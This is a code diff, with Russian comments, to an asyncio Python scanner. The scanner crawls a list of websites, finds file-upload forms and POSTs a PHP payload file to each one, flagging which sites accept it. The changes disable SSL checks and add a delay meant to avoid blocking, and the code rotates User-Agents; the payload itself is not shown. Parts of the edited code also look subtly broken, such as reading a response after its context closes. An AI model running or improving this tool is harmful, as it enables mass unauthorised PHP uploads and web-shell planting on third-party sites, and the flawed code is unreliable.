@@ -3,6 +3,7 @@ import asyncio
 from bs4 import BeautifulSoup
 import os
 from random import choice
+import time
 from urllib.parse import urljoin
 
 # Готовим файл для теста
@@ -36,30 +37,37 @@ async def scan_for_file_upload(session, url):
 
         headers = {'User-Agent': choice(USER_AGENTS)}
 
-        # Выполняем GET-запрос с заголовками
-        async with session.get(url, headers=headers) as response:
-            if response.status != 200:
-                print(f"[{url}] Ошибка получения страницы: {response.status}")
-                return
+        # Выполняем GET-запрос с заголовками, отключаем проверку SSL сертификатов
+        try:
+            async with session.get(url, headers=headers, ssl=False) as response:
+                if response.status != 200:
+                    print(f"[{url}] Ошибка получения страницы: {response.status}")
+                    return
+        except Exception as e:
+            print(f"[{url}] Ошибка при подключении: {str(e)}")
+            return
 
-            # Парсим HTML страницы
-            soup = BeautifulSoup(await response.text(), 'html.parser')
-            forms = soup.find_all('form')
+        # Парсим HTML страницы
+        soup = BeautifulSoup(await response.text(), 'html.parser')
+        forms = soup.find_all('form')
 
-            # Проверка на наличие формы с файлом
-            for form in forms:
-                file_input = form.find('input', {'type': 'file'})
-                if file_input:
-                    # Пытаемся найти точку загрузки
-                    action_url = form.get('action')
-                    full_action_url = urljoin(url, action_url) if action_url else url
-                    print(f"Найдена форма с загрузкой файлов на странице: {url}")
-                    result = await try_upload_file(session, full_action_url, payload_file)
-                    if result == "ДА":
-                        print(f"{url} - {GREEN}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
-                    else:
-                        print(f"{url} - {RED}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
-                    return  # Если файл загружен, можно прекратить обработку этой формы.
+        # Проверка на наличие формы с файлом
+        for form in forms:
+            file_input = form.find('input', {'type': 'file'})
+            if file_input:
+                # Пытаемся найти точку загрузки
+                action_url = form.get('action')
+                full_action_url = urljoin(url, action_url) if action_url else url
+                print(f"Найдена форма с загрузкой файлов на странице: {url}")
+                result = await try_upload_file(session, full_action_url, payload_file)
+                if result == "ДА":
+                    print(f"{url} - {GREEN}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
+                else:
+                    print(f"{url} - {RED}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
+                return  # Если файл загружен, можно прекратить обработку этой формы.
+
+        # Задержка между запросами, чтобы избежать блокировки
+        time.sleep(1)
 
     except Exception as e:
         print(f"Ошибка при обработке сайта {url}: {str(e)}")
@@ -72,17 +80,20 @@ async def try_upload_file(session, action_url, payload_file):
         async with aiohttp.ClientSession() as upload_session:
             with open(payload_file, 'rb') as file:
                 files = {'file': (payload_file, file, 'application/x-php')}
-                async with upload_session.post(action_url, data=files) as upload_response:
-                    if upload_response.status == 200:
-                        # Проверим, был ли файл успешно загружен
-                        if 'php' in await upload_response.text():
-                            return "ДА"
+                try:
+                    async with upload_session.post(action_url, data=files, ssl=False) as upload_response:
+                        if upload_response.status == 200:
+                            # Проверим, был ли файл успешно загружен
+                            if 'php' in await upload_response.text():
+                                return "ДА"
+                            else:
+                                return "НЕТ"
                         else:
-                            return "НЕТ"
-                    else:
-                        return f"Ошибка при загрузке: {upload_response.status}"
+                            return f"Ошибка при загрузке: {upload_response.status}"
+                except Exception as e:
+                    return f"Ошибка при загрузке на {action_url}: {str(e)}"
     except Exception as e:
-        return f"Ошибка при загрузке на {action_url}: {str(e)}"
+        return f"Ошибка при попытке загрузки на {action_url}: {str(e)}"
 
 # Основная функция для сканирования всех сайтов
 async def scan_sites_from_file(file_path):
